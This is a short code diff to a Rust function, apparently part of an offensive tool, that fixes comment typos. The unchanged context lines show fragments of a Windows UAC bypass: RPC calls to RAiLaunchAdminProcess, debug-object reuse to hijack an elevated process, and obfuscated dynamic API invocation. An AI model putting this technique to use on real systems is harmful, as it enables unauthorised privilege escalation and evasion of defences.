@@ -39,7 +39,7 @@ pub fn spawn_elevated_process(command: String, new_console: bool) -> bool
         let process_information: *mut APP_PROCESS_INFORMATION = std::mem::transmute(&APP_PROCESS_INFORMATION::default());
         let returned: *mut i32 = std::mem::transmute(&i32::default());
         
-        // First RPC to RAiLaunAdminProcess. This will spawn an uneleated Notepad process in debug mode. 
+        // First RPC to RAiLaunAdminProcess. This will spawn an unelevated Notepad process in debug mode. 
         dinvoke::dynamic_invoke!(mapped_stub.1,&lc!("Proc0_RAiLaunchAdminProcess"),rai_launch_admin_process_ptr,rai_launch_admin_process_r,ptr::null_mut(),
         path.as_ptr() as *mut u16,path.as_ptr() as *mut u16,admin,flags,current_directory.as_ptr() as *mut u16,winstation.as_ptr() as *mut u16,startup_info,
         0,-1,process_information,returned); 
@@ -81,8 +81,8 @@ pub fn spawn_elevated_process(command: String, new_console: bool) -> bool
 
         let nt_remove_process_debug: data::NtRemoveProcessDebug;
         let nt_remove_process_debug_r: Option<i32>;
-        // We detach the debug object, so it wont get more events coming from the unelevated process. However, the object is already created and it will
-        // be reused to debug any other process that the same thread in the RPC server spawns.
+        // We detach the debug object, so it won't get more events coming from the unelevated process. However, the object is already created and it will
+        // be reused to debug any other process that the same RPC server thread spawns.
         dinvoke::dynamic_invoke!(ntdll,&lc!("NtRemoveProcessDebug"),nt_remove_process_debug,nt_remove_process_debug_r,unelevated_handle,debug_object);
 
         if nt_remove_process_debug_r.unwrap() != 0
